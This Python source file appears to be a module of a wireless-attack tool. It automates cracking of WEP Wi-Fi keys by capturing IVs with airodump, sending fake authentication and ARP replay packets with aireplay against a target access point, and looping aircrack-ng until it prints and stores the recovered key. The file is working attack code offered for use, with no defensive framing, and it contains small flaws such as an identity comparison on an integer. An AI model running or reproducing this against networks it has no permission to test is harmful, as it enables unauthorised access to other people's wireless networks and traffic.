#!/usr/bin/env python3
import time
from subprocess import TimeoutExpired, run, PIPE, STDOUT

from tools.aireplay import Aireplay
from tools.airodump import Airodump
from tools.util import remove_colon


class Aircrack:
    def __init__(self):
        self.airodump = Airodump()
        self.aireplay = Aireplay()

    def aircrack(self, target):
        # Cracking
        crack = None
        try:
            crack = run(["aircrack-ng", "-q", "-b", target.bssid, target.target_ivs_file + '-01.cap'], stdout=PIPE,
                        stderr=STDOUT, timeout=600)
        except TimeoutExpired:
            print("timeout")
        return crack

    def crack_wep(self, target):
        crack = self.aircrack(target)
        code = 3
        if crack is not None:  # if not timeout
            code = crack.returncode
            results = crack.stdout.decode()
            for line in results.splitlines():
                if "KEY FOUND" in line:
                    print(line)
                    target.key = remove_colon(line[13:-4])
                    code = 0
                elif "Got no data packets" in line:
                    code = 3
        self.capture.kill()
        self.auth.kill()
        self.arp.kill()
        return code

    def auto_crack_wep(self, target):
        self.capture = self.airodump.capture_iv(target)
        self.auth = self.aireplay.fake_auth(target)
        self.arp = self.aireplay.arp_requesting(target)
        time.sleep(10)
        code = 3
        while code is 3:
            code = self.crack_wep(target)
        return code
